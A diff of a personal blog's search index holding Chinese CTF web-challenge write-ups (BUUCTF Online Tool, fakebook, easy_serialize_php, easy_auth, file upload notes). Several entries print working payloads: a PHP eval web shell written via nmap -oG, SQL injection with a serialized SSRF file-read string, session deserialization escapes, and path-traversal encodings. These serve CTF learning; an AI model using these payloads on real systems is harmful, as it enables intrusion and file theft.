@@ -218,23 +218,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Obsfuscation Isn&#39;t Enough</title>
-    <url>/2022/01/28/Obsfuscation-Isn-t-Enough/</url>
-    <content><![CDATA[<h1 id="Obsfuscation-Isn’t-Enough"><a href="#Obsfuscation-Isn’t-Enough" class="headerlink" title="Obsfuscation Isn’t Enough"></a>Obsfuscation Isn’t Enough</h1><p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/4.png" alt="1"></p>
-<p>猜测可能是sql注入但是不管，先看看源代码</p>
-<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/1.png" alt="1"></p>
-<p>发现一串很奇怪的符号其实是jsfuck</p>
-<p>可以直接拿到进开发者工具中执行</p>
-<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/2.png" alt="1"></p>
-<p>发现其中返回了location，直接进入那个页面看看</p>
-<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/3.png" alt="1"></p>
-<p>直接拿到了flag</p>
-]]></content>
-      <tags>
-        <tag>knightctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Most-Secure-Calculator</title>
     <url>/2022/01/28/Most-Secure-Calculator/</url>
     <content><![CDATA[<h1 id="计算器1"><a href="#计算器1" class="headerlink" title="计算器1"></a>计算器1</h1><p>一样先进去看一下</p>
@@ -255,47 +238,41 @@
       </tags>
   </entry>
   <entry>
-    <title>OnlineTool</title>
-    <url>/2022/02/03/OnlineTool/</url>
-    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">此题涉及到的知识点：</span><br><span class="line">nmap的使用、RCE、escapeshellarg和escapeshellcmd的组合引发的引号逃逸代码执行</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>题目一开始给到了思路RCE跟PHP</p>
-<p>有个host那就试试直接命令执行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?host=127.0.0.1;ls</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/02/03/OnlineTool/2.png" alt="1"></p>
-<p>没用，看看题目再看看代码，可能是跟nmap工具有关</p>
-<p>查了一下他的使用方法</p>
-<p>oG可以再文件里写入程序</p>
-<p><img src="/2022/02/03/OnlineTool/3.png" alt="1"></p>
-<p>那我们是否可以让他扫描我们的一句话木马存入我们指定的php文件中呢？</p>
-<p>试一下</p>
-<p><img src="/2022/02/03/OnlineTool/4.png" alt="1"></p>
-<p>发现可以上传</p>
-<p>也给了文件地址</p>
-<p>但是怎么也连不上</p>
-<p>而且还有两个函数也不太清楚</p>
-<p>实在不会，找了大佬的wp看了一下</p>
-<p>发现</p>
-<h3 id="escapeshellarg和escapeshellcmd使用不当会造成引号逃逸"><a href="#escapeshellarg和escapeshellcmd使用不当会造成引号逃逸" class="headerlink" title="escapeshellarg和escapeshellcmd使用不当会造成引号逃逸"></a>escapeshellarg和escapeshellcmd使用不当会造成引号逃逸</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">传入的参数是：172.17.0.2&#x27; -v -d a=1</span><br><span class="line">经过escapeshellarg处理后变成了&#x27;172.17.0.2&#x27;\&#x27;&#x27; -v -d a=1&#x27;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">经过escapeshellcmd处理后变成&#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</span><br><span class="line">最后执行的命令是curl &#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#x27;，即向172.17.0.2\发起请求，POST 数据为a=1&#x27;。</span><br><span class="line">原文链接：https://blog.csdn.net/qq_26406447/article/details/100711933</span><br></pre></td></tr></table></figure>
-
-<p>简单来说就是两次转义之后出现问题了，导致单引号逃逸</p>
-<p>源代码里echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
-<p>可以有传入参数，经过两层过滤常见的命令注入操作都不行</p>
-<p>因为escapeshellcmd会对前面的特殊符号进行转义，但是我们有nmap可以有哦那个nmap来执行就是上面的oG</p>
-<p>就可以想到上传一句话木马了</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>
-
-<p>返回了文件夹名字</p>
-<p>我们直接蚁剑链接就行了</p>
-<p><img src="/2022/02/03/OnlineTool/6.png" alt="1"></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">注意：?host=&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br><span class="line">单引号前面一定要加空格跟引号</span><br><span class="line">如果没有加引号，生成的文件名后面会多一个引号</span><br><span class="line">如果加了引号不加空格</span><br><span class="line">那么文件名后面会多\\</span><br><span class="line">只有让生成的所有引号全部跟我们的引号结合之后全部闭合才能够执行</span><br></pre></td></tr></table></figure>
-
+    <title>Tetris plus</title>
+    <url>/2022/02/06/Tetris-plus/</url>
+    <content><![CDATA[<h1 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris-plus"></a>Tetris-plus</h1><p>进入题目：</p>
+<p>发现是个游戏，先小玩一把。</p>
+<p><img src="/2022/02/06/Tetris-plus/1.png" alt="1"></p>
+<p>到最后也没发现啥问题</p>
+<p>点点别的也都正常</p>
+<p>看看源代码</p>
+<p><img src="/2022/02/06/Tetris-plus/3.png" alt="1"></p>
+<p>都是些不痛不痒的东西，但是包含的js非常多，都点进去看看</p>
+<p>在check.js页面发现他注释了段很长的东西，之前写过的jsfuck</p>
+<p><img src="/2022/02/06/Tetris-plus/2.png" alt="1"></p>
+<p>直接拿去开发者页面去编译一下jsfuck</p>
+<p><img src="/2022/02/06/Tetris-plus/5.png" alt="1"></p>
+<p>就得到了flag拉</p>
 ]]></content>
       <tags>
-        <tag>BUUCTF</tag>
+        <tag>hgame</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Obsfuscation Isn&#39;t Enough</title>
+    <url>/2022/01/28/Obsfuscation-Isn-t-Enough/</url>
+    <content><![CDATA[<h1 id="Obsfuscation-Isn’t-Enough"><a href="#Obsfuscation-Isn’t-Enough" class="headerlink" title="Obsfuscation Isn’t Enough"></a>Obsfuscation Isn’t Enough</h1><p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/4.png" alt="1"></p>
+<p>猜测可能是sql注入但是不管，先看看源代码</p>
+<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/1.png" alt="1"></p>
+<p>发现一串很奇怪的符号其实是jsfuck</p>
+<p>可以直接拿到进开发者工具中执行</p>
+<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/2.png" alt="1"></p>
+<p>发现其中返回了location，直接进入那个页面看看</p>
+<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/3.png" alt="1"></p>
+<p>直接拿到了flag</p>
+]]></content>
+      <tags>
+        <tag>knightctf</tag>
       </tags>
   </entry>
   <entry>
@@ -329,76 +306,125 @@
       </tags>
   </entry>
   <entry>
-    <title>fakebook</title>
-    <url>/2022/01/31/fakebook/</url>
-    <content><![CDATA[<h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><p>今天的第二条</p>
-<p>先看看题目</p>
-<p><img src="/2022/01/31/fakebook/1.png" alt="1"></p>
-<p>页面上有些登录信息以及两个网页</p>
-<p>join创建账户</p>
-<p><img src="/2022/01/31/fakebook/2.png" alt="1"></p>
-<p><img src="/2022/01/31/fakebook/7.png" alt="1"></p>
-<p>login登录</p>
-<p>登上去试试</p>
-<p><img src="/2022/01/31/fakebook/6.png" alt="1"></p>
-<p>可以看到这里面注入都没啥用</p>
-<p>用户名可以点击</p>
-<p>进去看看</p>
-<p><img src="/2022/01/31/fakebook/8.png" alt="1"></p>
-<p>可以看到以get方式传入了一个no</p>
-<p>测试一下sql注入</p>
-<p>发现屏蔽了空格可以用/**/绕过</p>
-<p>看一下列数</p>
-<p><img src="/2022/01/31/fakebook/3.png" alt="1"></p>
-<p>看到有4列而且2在页面上回显了</p>
-<p>看到有sql注入漏洞</p>
-<p>进行注入</p>
-<p><img src="/2022/01/31/fakebook/4.png" alt="1"></p>
-<p><img src="/2022/01/31/fakebook/5.png" alt="1"></p>
-<p>可以看到库表列，下面写一下我拿到的结果</p>
-<p>fakebook,information_schema,mysql,performance_schema,test    库</p>
-<p>fakebook里面含有users里面是我们注册时账号密码</p>
-<p>但是可以看到</p>
-<p><img src="/2022/01/31/fakebook/11.png" alt="1"></p>
-<p>可以看到里面时我们的账号密码以及data</p>
-<p>我们的密码时按照序列化显示的</p>
-<p>到这里卡住了</p>
-<p>想想别的办法</p>
-<p>查看一下robots.txt看看网页有没有设置机器人</p>
-<p><img src="/2022/01/31/fakebook/9.png" alt="1"></p>
-<p>一看还真有</p>
-<p>里面给出了提示有一个uesr.php的备份文件</p>
-<p>我们输入这个网址可以下载到这个文件的源代码</p>
-<p>看一下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>可以看到我们传入了三个参数，name，age以及blog而blog会读取我们输入的地址</p>
-<p>他的主要工作是建立会话判断一下是不是有效请求，不是就返回404，curl_exec这里是可能存在ssrf漏洞的</p>
-<p>可以用ssrf来伪文件读取</p>
-<p>可是我们怎么知道flag的文件地址呢</p>
-<p>试一下御剑</p>
-<p>可以看到flag.php就在文件当中，而之前的报错中可以看到大部分的网页全部都是存储再/var/www/html/中的</p>
-<p>我们可以来读一度这里的文件</p>
-<p>之前看到我们在之前注入的第四位是data，这个里面包含了博客的网址，如果其中有数就会读取出来</p>
-<p>而他又是序列化之后的结果，我们可以更改里面的数据让他读取的文件变成flag.php</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:21:&quot;paixiaoxing.github.io“;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>改成：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>就可以再回显的页面直接读取到flag.php里面的代码</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload=?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>在源代码里面发现了base64加密过的flag</p>
-<p>拿到解密文件里面解密一下就可以拿到flag了</p>
-<p>后来我回头又看了一下，知道了flag的路径，我们是不是也可以用load_file()这个函数直接读取flag里面的值呢</p>
-<p>看一下权限</p>
-<p><img src="/2022/01/31/fakebook/12.png" alt="1"></p>
-<p>发现居然是root权限那么应该可行</p>
-<p><img src="/2022/01/31/fakebook/13.png" alt="1"></p>
-<p>发现这样也可以拿到flag</p>
-<p>之前的需要base64解码一下</p>
+    <title>cybergrabs-easyweb</title>
+    <url>/2022/02/08/cybergrabs-easyweb/</url>
+    <content><![CDATA[<h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy-web"></a>easy-web</h1><p>进入题目也得先看看</p>
+<p><img src="/2022/02/08/cybergrabs-easyweb/1.png" alt="1"></p>
+<p>啥也没有，源代码也没啥</p>
+<p>抓个包看下（因为他刚进去的时候有的要等响应，抓错几次）</p>
+<p><img src="/2022/02/08/cybergrabs-easyweb/2.png" alt="1"></p>
+<p>可以看到我们传过去一个cookie</p>
+<p>而且从服务器端回传了一个cookie的value值，我们拿到这个值直接去base64解码就可以得到了</p>
 ]]></content>
+      <tags>
+        <tag>Cyber Grabs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cybergrabs-rabbit</title>
+    <url>/2022/02/08/cybergrabs-rabbit/</url>
+    <content><![CDATA[<h1 id="rabblt"><a href="#rabblt" class="headerlink" title="rabblt"></a>rabblt</h1><p>这道题跟之前的不一样</p>
+<p>在tryhackme网站里开了个攻击机</p>
+<p>我们自己连连不上</p>
+<p>题目提示让我们read flag.txt</p>
+<p>我们可以想到可能是文件读取或者文件包含，让我们直接读到flag.txt之中的内容</p>
+<p>打开之后照常先进网站看看</p>
+<p><img src="/2022/02/08/cybergrabs-rabbit/2.png" alt="1"></p>
+<p>发现这些没有那种类似文件包含的漏洞，</p>
+<p>那么会不会是在根目录下面直接读取flag.txt</p>
+<p>尝试了一下dirsearch，但是攻击机里面没有</p>
+<p>但是前面题目中提示了flag应该是在flag.txt里面</p>
+<p>所以我们直接读取flag.txt试试</p>
+<p><img src="/2022/02/08/cybergrabs-rabbit/3.png" alt="1"></p>
+<p>可以看到可以读取到flag</p>
+<p>提交</p>
+<p><img src="/2022/02/08/cybergrabs-rabbit/4.png" alt="1"></p>
+]]></content>
+      <tags>
+        <tag>Cyber Grabs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>easy_auth</title>
+    <url>/2022/02/06/easy-auth/</url>
+    <content><![CDATA[<h1 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h1><p>进去是一个注册登录框：</p>
+<p><img src="/2022/02/06/easy-auth/1.png" alt="1"></p>
+<p>先注册一个admin看看</p>
+<p><img src="/2022/02/06/easy-auth/5.png" alt="1"></p>
+<p>可以看到，admin用户是存在的</p>
+<p>那么有极大的可能就是第一个就是admin</p>
+<p>先随便注册一个进去先看看</p>
+<p><img src="/2022/02/06/easy-auth/2.png" alt="1"></p>
+<p>进入了这个页面</p>
+<p>下面有个对话框可以输入内容</p>
+<p>输入完会显示在网页上</p>
+<p>抓个包，抓doing包试试</p>
+<p><img src="/2022/02/06/easy-auth/3.png" alt="1"></p>
+<p>发过来好几个包，最后一个get包里面发现了我们想要的东西，可以看到我们返回了我的ID以及用户名</p>
+<p>而且我发过去的东西里面附带了一个token</p>
+<p>但是我不知道这视什么解码</p>
+<p>上网查了一下这种格式，非常可能是jwt的sha256解码</p>
+<p>进去看看</p>
+<p><img src="/2022/02/06/easy-auth/9.png" alt="1"></p>
+<p>发现确实是我们返回的内容，那么我们按照之前测试的尝试修改UserName改成admin，ID改成0试试第一个是不是admin</p>
+<p><img src="/2022/02/06/easy-auth/8.png" alt="1"></p>
+<p>好像不太行，但是有返回值，思路应该是对的，ID试试改成1</p>
+<p><img src="/2022/02/06/easy-auth/4.png" alt="1"></p>
+<p>可以看到他成功返回了并且返回了flag</p>
+]]></content>
+      <tags>
+        <tag>hgame</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>easy-serialize-php</title>
+    <url>/2022/02/09/easy-serialize-php/</url>
+    <content><![CDATA[<h1 id="安洵杯-easy-serialize-php"><a href="#安洵杯-easy-serialize-php" class="headerlink" title="[安洵杯]easy_serialize_php"></a>[安洵杯]easy_serialize_php</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">题目涉及到序列化漏洞的字符逃逸</span><br><span class="line">因为到后面序列化写不明白，看了一下大佬的wp</span><br><span class="line">（https://www.jianshu.com/p/8e8117f9fd0e）</span><br></pre></td></tr></table></figure>
+
+<p>进入题目有一个链接里面是源码</p>
+<p><img src="/2022/02/09/easy-serialize-php/1.png" alt="1"></p>
+<p>可以看到我们现在是在index.php网页中</p>
+<p>源码中提示在phpinfo里面由我们需要的东西</p>
+<p>进去看看</p>
+<p><img src="/2022/02/09/easy-serialize-php/2.png" alt="1"></p>
+<p>找到了一个子网页，那么就优先考虑到文件读取</p>
+<p>看了一圈只有最后输出的时候又个file_get_contents函数可以读取文件内容，他读取的文件内容是base64解码之后的img</p>
+<p>继续跟踪一下img，发现是由image_path传送进来的，但是我们输入img的时候会被函数过滤，所以img不可控</p>
+<p>找找别的方法，下面有个反序列化函数是我们可以更改的，那么我们是不是可以构造一个我们的文件来赋值给img来直接进行文件读取呢</p>
+<p>首先我们读取的文件base64：ZDBnM19mMWFnLnBocA==那么我们需要读取的内容就是s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”</p>
+<p>但是我上面有个过滤：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);// 在img中的所有的filter含有的字符串替换成空</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在这里面’php’,’flag’,’php5’,’php4’,’fl1g’会被替换为空</p>
+<p>也就是说</p>
+<p><img src="/2022/02/09/easy-serialize-php/6.png" alt="1"></p>
+<p>这是我们序列化之后的结果，但是经过过滤，它就变成了</p>
+<p><img src="/2022/02/09/easy-serialize-php/7.png" alt="1"></p>
+<p>那么他是否可以继续执行呢？</p>
+<p>这就涉及到字符串逃逸：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>因为经过过滤，把flag全部替换为空，所以序列化出现了问题，但是可以看到在替换之后<strong>s:24:” ”</strong>后面的24个字符**;s:8:”function”;s:59:”a“<strong>之后又是一个</strong>“;**直接闭合了，那么它会直接运行</p>
+<p>也就是说我们可以依靠这个过滤直接构造一个img来读取到我们想要读取的文件</p>
+<h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;</span><br></pre></td></tr></table></figure>
+
+<p>session序列化之后是这样的：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;flagflag&quot;;s:49:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br><span class="line">过滤之后：</span><br><span class="line">a:1:&#123;s:8:&quot;&quot;;s:49:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤之后就是把<strong>a</strong>赋值给了**;s:49:””**后面就是把我们需要输入的内容赋值给img就可以拉</p>
+<p>拿到页面内容：<img src="/2022/02/09/easy-serialize-php/3.png" alt="1"></p>
+<p><img src="/2022/02/09/easy-serialize-php/5.png" alt="1"></p>
+<p>我们直接将刚刚读取的文件名替换成这个就可以得到flag了</p>
+<h3 id="最终payload："><a href="#最终payload：" class="headerlink" title="最终payload："></a>最终payload：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>安洵杯</tag>
+      </tags>
   </entry>
   <entry>
     <title>myphpsite</title>
@@ -497,72 +523,36 @@
 ]]></content>
   </entry>
   <entry>
-    <title>文件上传</title>
-    <url>/2022/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h4 id="目录穿越绕过方式"><a href="#目录穿越绕过方式" class="headerlink" title="目录穿越绕过方式"></a>目录穿越绕过方式</h4><p>进行URL编码</p>
-<p>点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c</p>
-<p>进行16为Unicode编码</p>
-<p>点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216</p>
-<p>进行双倍URL编码</p>
-<p>点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c</p>
-<p>进行超长UTF-8 Unicode编码</p>
-<p>点–&gt;%c0%2e %e0$40%ae %c0ae</p>
-<p>反斜杠–&gt;%c0af %e0%80af %c0%af</p>
-<p>正斜杠–&gt;%c0%5c %c0%80%5c</p>
-<p>文件上传绕过客户端</p>
-<p>• 1.用firebug将form表单中的onsubmit事件删除</p>
-<p>• 2.上传木马文件，Burp拦截数据包，修改扩展名</p>
-<p>代码案例：</p>
-<p>name：客户端的原始上传文件名称</p>
-<p>• Type：上传文件的MIME类型</p>
-<p>• Tmp_name：服务器端用来保存上传文件的临时文件路径</p>
-<p>• Error：上传文件时的错误信息</p>
-<p>• Size：上传文件的大小，单位是</p>
-<p>• Content-Length,即上传内容大小</p>
-<p>• MAX_FILE_SIZE,即上传内容的最大长度</p>
-<p>• filename,即上传文件名</p>
-<p>• Content-Type,即上传文件类型</p>
-<p>• 请求包中的乱码字段，即是所上传文件的内容</p>
-<p>• 有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现</p>
-<p>php上传机制：</p>
-<p>0x01 PHP上传机制<br>php文件上传时会先将上传的文件保存到upload_tmp_dir该配置目录下，这里为/tmp，而上传页面只负责把该文件拷贝到目标目录。也就是说不管该php页面有没有文件上传功能，我们只要上传了文件，该文件就会被上传到upload_tmp_dir配置的目录下，上传完后会被删除。</p>
-<p>这里本地实验了一下，的确如此，我使用的是win10下phpstudy复现。</p>
-<p>需要把upload_tmp_dir 改为D:\phpStudy\tmp\tmp</p>
-<p>然后用intruder不停发包</p>
-<p>POST /test.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Content-Type: multipart/form-data; boundary=—————————10242300956292313528205888<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Length: 244</p>
-<p>—————————–10242300956292313528205888<br>Content-Disposition: form-data; name=”userfile1”; filename=”5.txt”<br>Content-Type: text/plain</p>
-<?php @eval($_POST['y1ng']); ?><p>—————————–10242300956292313528205888–</p>
-<p>最后发现了我们上传的文件：</p>
-<p>可惜我打开之后全是空的，不知道是不是因为已经被删除了。</p>
-<p>0x02 PHP命令执行<br>eval($cmd);<br>1<br>执行命令方式：</p>
-<p>system(‘ls’);</p>
-<p>echo(<code>ls</code>);</p>
-<p>echo+反引号</p>
-<p>?&gt;&lt;?=<code>ls</code>;</p>
-<?=是echo()的别名用法，不需要开启short_open_tag。
